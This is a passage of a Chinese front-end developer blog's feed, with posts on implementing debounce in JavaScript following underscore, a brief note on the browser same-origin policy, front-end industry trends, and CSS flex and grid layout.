context.fill();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;requestAnimationFrame-是什么&quot;&gt;&lt;a href=&quot;#requestAnimationFrame-是什么&quot; class=&quot;headerlink&quot; title=&quot;requestAnimationFrame 是什么?&quot;&gt;&lt;/a&gt;requestAnimationFrame 是什么?&lt;/h2&gt;&lt;p&gt;在浏览器动画程序中，我们一般会使用定时器来循环每隔多少毫秒来移动物体一次，来使它产生动画的效果。requestAnimationFrame()函数是针对动画效果的 API，告诉浏览器您希望执行动画并请求浏览器在下一次重绘之前调用指定的函数来更新动画，可以把它用在 DOM 上的风格变化或 canvas 动画或 WebGL 中。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>碎言心语-短笔记</title>
    <link href="https://www.chenqaq.com/2018/04/09/life-aboutIT/"/>
    <id>https://www.chenqaq.com/2018/04/09/life-aboutIT/</id>
    <published>2018-04-09T11:03:37.000Z</published>
    <updated>2020-07-23T04:13:38.771Z</updated>
    
    <content type="html"><![CDATA[<p>可以跟着<a href="https://zhuanlan.zhihu.com/p/35412015" target="_blank" rel="noopener">阿里的狼叔（花名）</a>了解一下前端近些几年的发展。从高中毕业接触前端开发近两年，但从大二才开始了解前端发展的历史和现状，也多少有些认识。</p><p>很多情况下，我们都是被动的接受者，这就好像我们拿的手机在更新换代，也就好像我们现在看到的网页和01年相比天壤之别，就像移动互联网时代兴起，我们从pc web慢慢转向移动端。这是一种我们后知后觉的变化趋势</p><p>因为我接触移动端稍稍要多于pc web端，<br>上次张小龙在微信公开课上声称微信用户已达10亿，微信小程序用户达1.7亿，微信悄然俨然成为一个操作系统，因为微信本身封闭，对外界来说，它是一个流量黑洞。眼看入口被微信把持，于是九大浏览器厂商联合发布”快应用”，一方面是为了夺回应用分支的主导权，说直接点就是在反攻”微信小程序”，防止被边缘化。另一方面官方也声称 “移动应用前端化”是大势所趋。</p><p>前端快速发展之下，必然改变我们未来的某些习惯。所以善待前端，感兴趣的就多深入些。</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;可以跟着&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35412015&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;阿里的狼叔（花名）&lt;/a&gt;了解一下前端近些几年的发展。从高中毕业接触前端开发近两年，但从大二才开始了解前端发展的历史和现状，也多少有些认识。&lt;/p&gt;
&lt;p&gt;很多情况下，我们都是被动的接受者，这就好像我们拿的手机在更新换代，也就好像我们现在看到的网页和01年相比天壤之别，就像移动互联网时代兴起，我们从pc web慢慢转向移动端。这是一种我们后知后觉的变化趋势&lt;/p&gt;
&lt;p&gt;因为我接触移动端稍稍要多于pc web端，&lt;br&gt;上次张小龙在微信公开课上声称微信用户已达10亿，微信小程序用户达1.7亿，微信悄然俨然成为一个操作系统，因为微信本身封闭，对外界来说，它是一个流量黑洞。眼看入口被微信把持，于是九大浏览器厂商联合发布”快应用”，一方面是为了夺回应用分支的主导权，说直接点就是在反攻”微信小程序”，防止被边缘化。另一方面官方也声称 “移动应用前端化”是大势所趋。&lt;/p&gt;
&lt;p&gt;前端快速发展之下，必然改变我们未来的某些习惯。所以善待前端，感兴趣的就多深入些。&lt;/p&gt;
    
    </summary>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/categories/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/tags/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>跟着underscore学习防抖和节流</title>
    <link href="https://www.chenqaq.com/2018/03/20/js-debounce-throttle/"/>
    <id>https://www.chenqaq.com/2018/03/20/js-debounce-throttle/</id>
    <published>2018-03-20T07:54:44.000Z</published>
    <updated>2020-07-23T04:13:38.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="有个开始吧！"><a href="#有个开始吧！" class="headerlink" title="有个开始吧！"></a>有个开始吧！</h1><p>网上有很多的防抖与节流的文章，自己也早有耳闻，之前看underscore的代码，也发现了两个与众不同的函数debounce和throttle，仿佛是有特定的用途。学习实践之后便总结下这篇文章。</p><p>在前端开发中经常遇到一些频繁触发的事件，比如</p><ul><li>键盘事件：keyup、keydown…</li><li>window：resize、scroll…</li><li>鼠标事件：mousedown、mousemove…</li></ul><p>那么什么是事件的频发触发呢？让我们写一个例子来了解事件的频繁触发；</p><a id="more"></a><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>学习事件的频发触发<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    * &#123;</span><br><span class="line">      padding: 0;</span><br><span class="line">      margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line">      width: 50vw;</span><br><span class="line">      height: 30vh;</span><br><span class="line">      margin: 50px auto;</span><br><span class="line">      background: yellowgreen;</span><br><span class="line">      border-radius: 5px;</span><br><span class="line">      text-align: center;</span><br><span class="line">      line-height: 30vh;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"debounce.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>debounce.js代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = getAction;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img alt="时间频发触发" data-src="http://www.chenqaq.com/assets/images/debounce1.gif" class="lazyload"></p><p>我们发现鼠标从盒子左侧平稳的滑到右侧，数字从1增加到了188，也就是说在极短的时间内getAction这个函数就触发了188次。可想而知，如果这个问题是复杂回调或者ajax请求等等，每个回调就必须在更短的时间内执行完毕，否则就会出现卡顿现象。</p><p>对于这个问题，防抖和节流就是两种很好的解决方案。</p><h1 id="防抖与节流介绍"><a href="#防抖与节流介绍" class="headerlink" title="防抖与节流介绍"></a>防抖与节流介绍</h1><p>防抖的原理就是：尽管时间触发，但是我一定要到事件触发n秒后才执行。如果在这个时间内又触发了这个事件，那就以新的事件的时间为准，触发n秒后才执行。主要是通过定时器来实现</p><p>而节流的原理是：如果持续触发事件，每隔一段时间，只执行一次事件。主要通过时间戳或者定时器来实现</p><h1 id="实现防抖debounce"><a href="#实现防抖debounce" class="headerlink" title="实现防抖debounce"></a>实现防抖debounce</h1><p>根据原理我们就可以来写第一版debounce代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      clearTimeout(timeout)</span><br><span class="line">      timeout = setTimeout(func, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = debounce(getAction, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img alt="debounce第一版" data-src="http://www.chenqaq.com/assets/images/debounce2.gif" class="lazyload"></p><p>从效果中很明显可以看出来，无论开始怎么在盒子内移动鼠标，数值都不会加1，直到鼠标停下来，并且等待1s后，getAction函数执行使数值加1。</p><h3 id="this带来的问题"><a href="#this带来的问题" class="headerlink" title="this带来的问题"></a>this带来的问题</h3><p>如果在getAction函数中<code>console.log(this)</code>，在不使用debounce函数时，<code>this</code>的值为</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是我们在使用我们的debounce函数时，这个this就指向了window！（这是由于嵌套函数内部的this都会失去方向，指向window对象。可参见我写的<a href="http://www.cnblogs.com/okaychen/p/7520472.html" target="_blank" rel="noopener">this四种绑定方式之间的奇淫技巧</a>）</p><p>所以我们必须要将this指向正确的对象：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">timeout</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    clearTimeout(timeout);</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="event对象"><a href="#event对象" class="headerlink" title="event对象"></a>event对象</h3><p>JavaScript在事件处理函数中提供事件对象event；</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">  container.innerHTML = count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们不使用debounce函数，通过container.onmousemove调用，这里便会打印出MouseEvent对象<br><img alt="MouseEvent" data-src="http://www.chenqaq.com/assets/images/debounce3.png" class="lazyload"></p><p>但是如果在通过debounce函数，却只会打印出undefined!让我们来改善一下debounce函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    clearTimeout(timeout)</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context, args)</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，在我们根据原理写的debounce的基础上，我们又解决了this指向和event对象的问题。</p><h3 id="立即执行"><a href="#立即执行" class="headerlink" title="立即执行"></a>立即执行</h3><p>这时候我们的代码已经很完善了，但是我们应该考虑到的一点是：<br>上面的代码我们总是需要等到事件停止触发n秒后。<br>我们想要的是：开始时候立即执行函数，然后等到停止触发n秒后，才可以重新触发执行。<br>我们加一个immediate参数判断是否立即执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout, result;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">    <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">      <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">      &#125;, wait)</span><br><span class="line">      <span class="keyword">if</span> (callNow) result = func.apply(context, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        func.apply(context, args);</span><br><span class="line">      &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取消"><a href="#取消" class="headerlink" title="取消"></a>取消</h3><p>最后我们希望能够取消debounce函数，比如我们的debounce函数的时间间隔是10秒钟，immediate为true，这样的话，我们只有等待10s后才可以触发事件，所以我希望能有一个按钮能够取消防抖，这样再去触发，就可以又立刻执行啦。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> timeout, result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> debounced = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">        <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">            <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">            <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                timeout = <span class="literal">null</span>;</span><br><span class="line">            &#125;, wait)</span><br><span class="line">            <span class="keyword">if</span> (callNow) result = func.apply(context, args)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                func.apply(context, args)</span><br><span class="line">            &#125;, wait);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    debounced.cancel = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clearTimeout(timeout);</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> debounced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如何使用cancel函数呢？依然以上面的demo为例</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> setAction = debounce(getAction,<span class="number">10000</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">container.onmousemove = setAction;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"button"</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  setAction.cancel();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>效果演示如下：<br><img alt="debounce cancel" data-src="http://www.chenqaq.com/assets/images/debounce3.gif" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;有个开始吧！&quot;&gt;&lt;a href=&quot;#有个开始吧！&quot; class=&quot;headerlink&quot; title=&quot;有个开始吧！&quot;&gt;&lt;/a&gt;有个开始吧！&lt;/h1&gt;&lt;p&gt;网上有很多的防抖与节流的文章，自己也早有耳闻，之前看underscore的代码，也发现了两个与众不同的函数debounce和throttle，仿佛是有特定的用途。学习实践之后便总结下这篇文章。&lt;/p&gt;
&lt;p&gt;在前端开发中经常遇到一些频繁触发的事件，比如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;键盘事件：keyup、keydown…&lt;/li&gt;
&lt;li&gt;window：resize、scroll…&lt;/li&gt;
&lt;li&gt;鼠标事件：mousedown、mousemove…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么什么是事件的频发触发呢？让我们写一个例子来了解事件的频繁触发；&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.chenqaq.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>浏览器同源政策</title>
    <link href="https://www.chenqaq.com/2018/03/15/cross-domain-cors/"/>
    <id>https://www.chenqaq.com/2018/03/15/cross-domain-cors/</id>
    <published>2018-03-15T02:51:07.000Z</published>
    <updated>2020-07-23T04:13:38.764Z</updated>
    
    <content type="html"><![CDATA[<p>我们都知道浏览器的“同源政策”是浏览器安全的基石，根本目的是为了保护用户信息安全，防止恶意的网站窃取数据。<br>1995年，同源政策由Netscape 公司引入。目前，所有浏览器都执行这个政策。</p><a id="more"></a><p>随着互联网的发展，保障用户的信息安全也越来越重要。非同源将受到三种行为的限制：</p><blockquote><ul><li>Cookie、localstorage、IndexDB无法读取</li></ul></blockquote><ul><li>DOM无法获得</li><li>AJAX无法发送</li></ul><p>所谓”同源”即指三个相同，</p><blockquote><ul><li>域名相同</li></ul></blockquote><ul><li>协议相同</li><li>端口相同</li></ul><p>举个栗子，<a href="https://www.chenqaq.com，协议就是http://,域名是www.chenqaq.com，端口默认为80。" target="_blank" rel="noopener">https://www.chenqaq.com，协议就是http://,域名是www.chenqaq.com，端口默认为80。</a></p><p>ing…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们都知道浏览器的“同源政策”是浏览器安全的基石，根本目的是为了保护用户信息安全，防止恶意的网站窃取数据。&lt;br&gt;1995年，同源政策由Netscape 公司引入。目前，所有浏览器都执行这个政策。&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>拥抱未来的布局方式</title>
    <link href="https://www.chenqaq.com/2018/03/07/css-layout-flex-grid/"/>
    <id>https://www.chenqaq.com/2018/03/07/css-layout-flex-grid/</id>
    <published>2018-03-07T09:41:18.000Z</published>
    <updated>2020-07-23T04:13:38.764Z</updated>
    
    <content type="html"><![CDATA[<p>相比传统的布局方式，flex 和 grid 使布局系统简化，轻松的解决了复杂的 web 布局。<br>早在以前，所有的 HTML 布局还是通过 table，float 以及其他 css 属性来完成。面对复杂的布局，就没有很好的办法了。<br>随着 flexbox 的出现，它专注于创建稳健的响应式页面布局模式，并轻松的正确对齐元素及其内容。如今已是我们的首选。</p><a id="more"></a><p><a href="https://caniuse.com/#feat=flexbox" target="_blank" rel="noopener">Can I Use FlexBox?</a></p><p><img alt data-src="http://www.chenqaq.com/assets/images/css-layout-flex1.png" class="lazyload"></p><p>如今 flexbox 随着浏览器的发展（IE9 以下版本渐渐退出舞台），flexbox 如火如荼成为了 css 布局的主流，前端开发者的首选。</p><p>与此同时，grid 布局在 2010 年由 Microsoft 首次提出，目前已成为 W3C 候选标准，支持 grid 布局的浏览器也越来越多</p><p><a href="https://caniuse.com/#feat=css-grid" target="_blank" rel="noopener">Can I Use Grid?</a></p><p><img alt data-src="http://www.chenqaq.com/assets/images/css-layout-grid1.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;相比传统的布局方式，flex 和 grid 使布局系统简化，轻松的解决了复杂的 web 布局。&lt;br&gt;早在以前，所有的 HTML 布局还是通过 table，float 以及其他 css 属性来完成。面对复杂的布局，就没有很好的办法了。&lt;br&gt;随着 flexbox 的出现，它专注于创建稳健的响应式页面布局模式，并轻松的正确对齐元素及其内容。如今已是我们的首选。&lt;/p&gt;
    
    </summary>
    
    
      <category term="HTML/CSS" scheme="https://www.chenqaq.com/categories/HTML-CSS/"/>
    
    
      <category term="CSS" scheme="https://www.chenqaq.com/tags/CSS/"/>
    
      <category term="Layout" scheme="https://www.chenqaq.com/tags/Layout/"/>
    
  </entry>
  
</feed>
